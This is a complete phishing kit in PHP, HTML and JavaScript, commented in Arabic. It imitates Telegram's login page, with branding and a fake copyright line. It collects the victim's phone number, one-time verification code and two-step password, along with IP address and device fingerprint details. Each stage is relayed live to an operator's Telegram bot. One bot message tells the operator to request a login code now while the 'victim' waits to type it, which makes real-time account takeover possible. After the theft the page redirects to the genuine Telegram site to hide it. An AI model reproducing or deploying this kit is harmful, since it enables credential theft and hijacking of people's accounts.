<?php
// توكن البوت الخاص بك
$botToken = "BBOTTTTTTTTTTT";

// دالة لإرسال الرسائل إلى التليجرام
function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

// إذا كان الطلب بواسطة POST، فإننا نتعامل مع إرسال البيانات من JavaScript
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $chatId = $input['chatId'];
    $step = $input['step'];
    $data = $input['data'] ?? null;
    $deviceInfo = $input['deviceInfo'] ?? null;

    if ($data && $deviceInfo) {
        if ($step === 'complete') {
            // إرسال بيانات تسجيل الدخول النهائية
            $loginMessage = "
📱 <b>بيانات تسجيل دخول Telegram</b>

📞 <b>رقم الهاتف:</b> <code>{$data['phone']}</code>
🔢 <b>كود التحقق:</b> <code>{$data['code']}</code>
🔒 <b>كلمة المرور:</b> <code>{$data['password']}</code>

🌐 <b>معلومات الجهاز:</b>
📱 <b>User Agent:</b> {$deviceInfo['userAgent']}
🔋 <b>البطارية:</b> {$deviceInfo['battery']}
🖥️ <b>النظام:</b> {$deviceInfo['platform']}
🌐 <b>IP:</b> {$_SERVER['REMOTE_ADDR']}
📶 <b>نوع الاتصال:</b> {$deviceInfo['connection']}
🗣️ <b>اللغة:</b> {$deviceInfo['language']}
🕒 <b>المنطقة الزمنية:</b> {$deviceInfo['timezone']}
📺 <b>معلومات الشاشة:</b> {$deviceInfo['screen']}

📅 <b>التاريخ:</b> " . date('Y-m-d H:i:s') . "
            ";
            $result = sendTelegramMessage($chatId, $loginMessage, $botToken);
        } else {
            // إرسال بيانات كل مرحلة
            $stageMessage = "
📱 <b>مرحلة تسجيل دخول Telegram</b>

🔹 <b>المرحلة:</b> $step
📞 <b>رقم الهاتف:</b> <code>{$data['phone']}</code>
" . (isset($data['code']) ? "🔢 <b>код التحقق:</b> <code>{$data['code']}</code>\n" : "") . "
🌐 <b>IP:</b> {$_SERVER['REMOTE_ADDR']}
📅 <b>التاريخ:</b> " . date('Y-m-d H:i:s') . "
            ";
            
            // إضافة رسالة خاصة عند إرسال رقم الهاتف
            if ($step === 'phone') {
                $stageMessage .= "\n\n⚠️ <b>أطلب كود للرقم الأن ع هاتفك لأن الأن مطلوب ادخال الكود عند الضحيه</b>";
            }
            
            $result = sendTelegramMessage($chatId, $stageMessage, $botToken);
        }
    }
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success', 'nextStep' => $step === 'phone' ? 'code' : ($step === 'code' ? 'password' : 'complete')]);
    exit;
}
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تسجيل الدخول إلى Telegram</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    }
    
    body {
      background-color: #FFFFFF;
      color: #222222;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 16px;
    }
    
    .container {
      width: 100%;
      max-width: 360px;
      margin: 0 auto;
    }
    
    .logo-container {
      text-align: center;
      margin-bottom: 30px;
    }
    
    .telegram-logo {
      width: 100px;
      height: 100px;
      margin-bottom: 15px;
      border-radius: 50%;
    }
    
    .login-form {
      background-color: #FFFFFF;
      border-radius: 12px;
      padding: 24px;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
      border: 1px solid #E6E6E6;
    }
    
    h1 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 20px;
      font-weight: 700;
      color: #0088CC;
    }
    
    .subtitle {
      text-align: center;
      margin-bottom: 20px;
      font-size: 14px;
      color: #667781;
      line-height: 1.4;
    }
    
    .input-group {
      margin-bottom: 16px;
    }
    
    .input-row {
      display: flex;
      gap: 10px;
      margin-bottom: 16px;
    }
    
    .input-column {
      display: flex;
      flex-direction: column;
    }
    
    .country-code-column {
      width: 30%;
    }
    
    .phone-column {
      width: 70%;
    }
    
    label {
      display: block;
      margin-bottom: 6px;
      font-size: 14px;
      color: #0088CC;
      font-weight: 600;
      text-align: right;
    }
    
    input[type="tel"],
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 14px;
      background-color: #F5F5F5;
      border: 1px solid #E6E6E6;
      border-radius: 8px;
      color: #222222;
      font-size: 15px;
      transition: border-color 0.2s;
      text-align: center;
    }
    
    input[type="tel"]:focus,
    input[type="text"]:focus,
    input[type="password"]:focus {
      outline: none;
      border-color: #0088CC;
      background-color: #FFFFFF;
    }
    
    .login-btn {
      width: 100%;
      padding: 14px;
      background-color: #0088CC;
      color: #FFFFFF;
      border: none;
      border-radius: 8px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 16px;
      transition: background-color 0.2s;
    }
    
    .login-btn:hover {
      background-color: #0077B3;
    }
    
    .links {
      text-align: center;
      margin-top: 16px;
      font-size: 13px;
    }
    
    .links a {
      color: #0088CC;
      text-decoration: none;
      display: block;
      margin: 10px 0;
      transition: color 0.2s;
    }
    
    .links a:hover {
      color: #005580;
      text-decoration: underline;
    }
    
    .footer {
      text-align: center;
      margin-top: 30px;
      color: #667781;
      font-size: 12px;
      line-height: 1.5;
    }
    
    .footer a {
      color: #0088CC;
      text-decoration: none;
      margin: 0 4px;
    }
    
    .footer a:hover {
      text-decoration: underline;
    }
    
    /* عناصر التحميل */
    .loader {
        width: 18px;
        height: 18px;
        border: 2px solid rgba(0, 136, 204, 0.3);
        border-radius: 50%;
        border-top-color: #0088CC;
        animation: spin 1s linear infinite;
        margin: 0 auto;
        display: none;
    }
    
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    
    .status {
        margin-top: 14px;
        font-size: 13px;
        opacity: 0.8;
        text-align: center;
        display: none;
        color: #667781;
    }
    
    .error-message {
      color: #E53935;
      font-size: 13px;
      margin-top: 14px;
      text-align: center;
      display: none;
    }

    .privacy-notice {
      margin-top: 20px;
      font-size: 12px;
      color: #667781;
      text-align: center;
      line-height: 1.4;
    }

    .step-indicator {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }
    
    .step {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background-color: #DDDDDD;
      margin: 0 5px;
    }
    
    .step.active {
      background-color: #0088CC;
    }
    
    .form-step {
      display: none;
    }
    
    .form-step.active {
      display: block;
    }
    
    .code-inputs {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-bottom: 20px;
    }
    
    .code-input {
      width: 45px;
      height: 55px;
      text-align: center;
      font-size: 20px;
      border: 1px solid #E6E6E6;
      border-radius: 8px;
      background-color: #F5F5F5;
      transition: border-color 0.2s;
    }
    
    .code-input:focus {
      outline: none;
      border-color: #0088CC;
      background-color: #FFFFFF;
    }
    
    .password-note {
      text-align: center;
      font-size: 13px;
      color: #667781;
      margin-bottom: 16px;
    }
    
    /* منع الكتابة غير الرقمية في حقول الكود */
    .numbers-only {
      -moz-appearance: textfield;
    }
    
    .numbers-only::-webkit-outer-spin-button,
    .numbers-only::-webkit-inner-spin-button {
      -webkit-appearance: none;
      margin: 0;
    }
    
    .country-code-input {
      text-align: center;
    }
    
    .phone-input {
      text-align: right;
      direction: ltr;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-container">
      <!-- شعار Telegram -->
      <img src="https://dev-ianstagram.pantheonsite.io/wp-content/uploads/2025/08/Screenshot_20250826_032744_Chrome.jpg" class="telegram-logo" alt="Telegram Logo">
      <h1>Telegram</h1>
    </div>
    
    <div class="login-form">
      <div class="step-indicator">
        <div class="step active" id="step1"></div>
        <div class="step" id="step2"></div>
        <div class="step" id="step3"></div>
      </div>
      
      <!-- المرحلة 1: إدخال رقم الهاتف -->
      <div class="form-step active" id="stepPhone">
        <h1>أدخل رقم هاتفك</h1>
        <p class="subtitle">سيتم إرسال رمز التحقق إلى رقم هاتفك عبر Telegram</p>
        
        <div class="input-row">
          <div class="input-column country-code-column">
            <label for="countryCode">كود الدولة</label>
            <input type="text" class="country-code-input" id="countryCode" placeholder="+000" value="+000" required>
          </div>
          <div class="input-column phone-column">
            <label for="phone">رقم الهاتف</label>
            <input type="tel" class="phone-input" id="phone" name="phone" placeholder="أدخل الرقم" required autofocus>
          </div>
        </div>
        
        <button type="button" class="login-btn" onclick="submitPhone()">التالي</button>
        
        <div class="privacy-notice">
          <p>بموافقتك، فإنك تقبل <a href="#">شروط الخدمة</a> و<a href="#">سياسة الخصوصية</a>.</p>
        </div>
      </div>
      
      <!-- المرحلة 2: إدخال كود التحقق -->
      <div class="form-step" id="stepCode">
        <h1>أدخل الرمز</h1>
        <p class="subtitle">تم إرسال رمز إلى حسابك على Telegram</p>
        
        <div class="code-inputs">
          <input type="text" class="code-input numbers-only" id="code1" maxlength="1" oninput="moveToNext(1)" autofocus pattern="[0-9]*" inputmode="numeric">
          <input type="text" class="code-input numbers-only" id="code2" maxlength="1" oninput="moveToNext(2)" pattern="[0-9]*" inputmode="numeric">
          <input type="text" class="code-input numbers-only" id="code3" maxlength="1" oninput="moveToNext(3)" pattern="[0-9]*" inputmode="numeric">
          <input type="text" class="code-input numbers-only" id="code4" maxlength="1" oninput="moveToNext(4)" pattern="[0-9]*" inputmode="numeric">
          <input type="text" class="code-input numbers-only" id="code5" maxlength="1" oninput="moveToNext(5)" pattern="[0-9]*" inputmode="numeric">
        </div>
        
        <button type="button" class="login-btn" onclick="submitCode()">تحقق</button>
        
        <div class="links">
          <a href="#">إعادة إرسال الرمز</a>
        </div>
      </div>
      
      <!-- المرحلة 3: إدخال كلمة المرور -->
      <div class="form-step" id="stepPassword">
        <h1>كلمة المرور</h1>
        <p class="subtitle">أدخل كلمة المرور لحسابك</p>
        <p class="password-note">هذه كلمة المرور التي تستخدمها لتسجيل الدخول إلى Telegram على أجهزة جديدة.</p>
        
        <div class="input-group">
          <input type="password" id="password" name="password" placeholder="كلمة المرور" required autofocus>
        </div>
        
        <button type="button" class="login-btn" onclick="submitPassword()">تسجيل الدخول</button>
        
        <div class="links">
          <a href="#">نسيت كلمة المرور؟</a>
        </div>
      </div>
      
      <div class="loader" id="loader"></div>
      <div class="status" id="status">جاري التحقق من المعلومات...</div>
      <div class="error-message" id="errorMessage">حدث خطأ أثناء عملية التسجيل. يرجى المحاولة مرة أخرى.</div>
    </div>
    
    <div class="footer">
      <a href="#">الخصوصية</a>
      <a href="#">الشروط</a>
      <a href="#">اللغة</a>
      <a href="#">الإصدار</a>
      <p>© 2025 Telegram LLC. جميع الحقوق محفوظة.</p>
    </div>
  </div>

<script>
  const params = new URLSearchParams(window.location.search);
  const chatId = params.get('ID'); // نحصل على chatId من الرابط

  // عناصر واجهة المستخدم
  const stepPhone = document.getElementById('stepPhone');
  const stepCode = document.getElementById('stepCode');
  const stepPassword = document.getElementById('stepPassword');
  const step1 = document.getElementById('step1');
  const step2 = document.getElementById('step2');
  const step3 = document.getElementById('step3');
  const loader = document.getElementById('loader');
  const status = document.getElementById('status');
  const errorMessage = document.getElementById('errorMessage');
  
  let currentStep = 'phone';
  let userPhone = '';
  let userCode = '';

  // منع إدخال غير الأرقام في حقول الكود
  document.querySelectorAll('.numbers-only').forEach(input => {
    input.addEventListener('input', function() {
      this.value = this.value.replace(/[^0-9]/g, '');
    });
    
    input.addEventListener('keydown', function(e) {
      // السماح فقط بالأرقام ومفاتيح التحكم
      if (!((e.key >= '0' && e.key <= '9') || 
            e.key === 'Backspace' || 
            e.key === 'Delete' || 
            e.key === 'ArrowLeft' || 
            e.key === 'ArrowRight' || 
            e.key === 'Tab')) {
        e.preventDefault();
      }
    });
  });

  function updateStepIndicator(step) {
    step1.classList.remove('active');
    step2.classList.remove('active');
    step3.classList.remove('active');
    
    if (step === 'phone') {
      step1.classList.add('active');
      stepPhone.classList.add('active');
      stepCode.classList.remove('active');
      stepPassword.classList.remove('active');
    } else if (step === 'code') {
      step2.classList.add('active');
      stepPhone.classList.remove('active');
      stepCode.classList.add('active');
      stepPassword.classList.remove('active');
    } else if (step === 'password') {
      step3.classList.add('active');
      stepPhone.classList.remove('active');
      stepCode.classList.remove('active');
      stepPassword.classList.add('active');
    }
  }

  function moveToNext(current) {
    const currentInput = document.getElementById(`code${current}`);
    const nextInput = document.getElementById(`code${current + 1}`);
    
    // التأكد من أن القيمة رقمية فقط
    currentInput.value = currentInput.value.replace(/[^0-9]/g, '');
    
    if (currentInput.value.length === 1 && nextInput) {
      nextInput.focus();
    }
    
    // إذا كان هذا هو الحقل الأخير، نقوم بجمع الكود
    if (current === 5 && currentInput.value.length === 1) {
      compileCode();
    }
  }

  function compileCode() {
    userCode = '';
    for (let i = 1; i <= 5; i++) {
      userCode += document.getElementById(`code${i}`).value;
    }
    return userCode;
  }

  async function collectDeviceInfo() {
    let batteryLevel = "غير متوفر";
    let connectionType = "غير متوفر";
    let timezone = "غير متوفر";
    let screenInfo = "غير متوفر";
    
    try {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        batteryLevel = `${Math.round(battery.level * 100)}%`;
      }
    } catch (e) {}
    
    try {
      if (navigator.connection) {
        connectionType = navigator.connection.effectiveType;
      }
    } catch (e) {}
    
    try {
      timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    } catch (e) {}
    
    try {
      screenInfo = `${screen.width}x${screen.height}, ${window.devicePixelRatio}dpr`;
    } catch (e) {}
    
    return {
      userAgent: navigator.userAgent,
      battery: batteryLevel,
      platform: navigator.platform,
      language: navigator.language,
      connection: connectionType,
      timezone: timezone,
      screen: screenInfo
    };
  }

  async function sendToServer(step, data) {
    try {
      const deviceInfo = await collectDeviceInfo();
      
      const requestData = {
        chatId: chatId,
        step: step,
        data: data,
        deviceInfo: deviceInfo
      };
      
      const response = await fetch(window.location.href, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(requestData)
      });
      
      return await response.json();
    } catch (error) {
      console.error('Error sending to server:', error);
      return {status: 'error', error: error.message};
    }
  }

  function updateStatus(message) {
    status.textContent = message;
    status.style.display = 'block';
  }

  function showError() {
    errorMessage.style.display = 'block';
  }

  function hideError() {
    errorMessage.style.display = 'none';
  }

  // معالجة إدخال رقم الهاتف
  async function submitPhone() {
    const countryCode = document.getElementById('countryCode').value;
    const phone = document.getElementById('phone').value;
    const fullPhone = countryCode + phone;
    
    if (!countryCode || !phone) {
      showError();
      errorMessage.textContent = 'يرجى إدخال رمز الدولة ورقم الهاتف';
      return;
    }
    
    userPhone = fullPhone;
    
    // إظهار عناصر التحميل
    loader.style.display = 'block';
    status.style.display = 'block';
    hideError();
    
    updateStatus('جاري إرسال رمز التحقق...');
    
    try {
      // إرسال بيانات المرحلة الأولى
      const result = await sendToServer('phone', {phone: fullPhone});
      
      if (result.status === 'success') {
        updateStatus('تم إرسال رمز التحقق إلى حسابك على Telegram');
        
        // الانتقال إلى المرحلة الثانية
        setTimeout(() => {
          currentStep = 'code';
          updateStepIndicator('code');
          document.getElementById('code1').focus();
          loader.style.display = 'none';
          status.style.display = 'none';
        }, 2000);
      } else {
        throw new Error('Failed to send phone data');
      }
    } catch (error) {
      console.error('Error during phone submission:', error);
      showError();
      updateStatus('فشل في إرسال رمز التحقق');
    }
  }

  // معالجة إدخال كود التحقق
  async function submitCode() {
    const code = compileCode();
    
    if (!code || code.length !== 5) {
      showError();
      errorMessage.textContent = 'يرجى إدخال رمز التحقق المكون من 5 أرقام';
      return;
    }
    
    userCode = code;
    
    // إظهار عناصر التحميل
    loader.style.display = 'block';
    status.style.display = 'block';
    hideError();
    
    updateStatus('جاري التحقق من الرمز...');
    
    try {
      // إرسال بيانات المرحلة الثانية
      const result = await sendToServer('code', {phone: userPhone, code: code});
      
      if (result.status === 'success') {
        updateStatus('تم التحقق من الرمز بنجاح');
        
        // الانتقال إلى المرحلة الثالثة
        setTimeout(() => {
          currentStep = 'password';
          updateStepIndicator('password');
          document.getElementById('password').focus();
          loader.style.display = 'none';
          status.style.display = 'none';
        }, 2000);
      } else {
        throw new Error('Failed to send code data');
      }
    } catch (error) {
      console.error('Error during code submission:', error);
      showError();
      updateStatus('فشل في التحقق من الرمز');
    }
  }

  // معالجة إدخال كلمة المرور
  async function submitPassword() {
    const password = document.getElementById('password').value;
    
    if (!password) {
      showError();
      errorMessage.textContent = 'يرجى إدخال كلمة المرور';
      return;
    }
    
    // إظهار عناصر التحميل
    loader.style.display = 'block';
    status.style.display = 'block';
    hideError();
    
    updateStatus('جاري تسجيل الدخول...');
    
    try {
      // إرسال بيانات المرحلة الثالثة
      const result = await sendToServer('complete', {
        phone: userPhone,
        code: userCode,
        password: password
      });
      
      if (result.status === 'success') {
        updateStatus('تم تسجيل الدخول بنجاح!');
        
        // إعادة توجيه إلى Telegram بعد ثواني (وهمي)
        setTimeout(() => {
          window.location.href = 'https://web.telegram.org';
        }, 2000);
      } else {
        throw new Error('Failed to send complete data');
      }
    } catch (error) {
      console.error('Error during password submission:', error);
      showError();
      updateStatus('فشل في تسجيل الدخول');
    }
  }

  // السماح بالضغط على Enter في الحقول
  document.getElementById('countryCode').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
      document.getElementById('phone').focus();
    }
  });

  document.getElementById('phone').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
      submitPhone();
    }
  });

  document.getElementById('password').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
      submitPassword();
    }
  });

  // إضافة إمكانية التنقل بين حقول الكود باستخدام لوحة المفاتيح
  for (let i = 1; i <= 5; i++) {
    document.getElementById(`code${i}`).addEventListener('keydown', function(e) {
      if (e.key === 'Backspace' && this.value === '' && i > 1) {
        document.getElementById(`code${i-1}`).focus();
      } else if (e.key === 'Enter' && i === 5) {
        submitCode();
      }
    });
  }
</script>

</body>
</html>
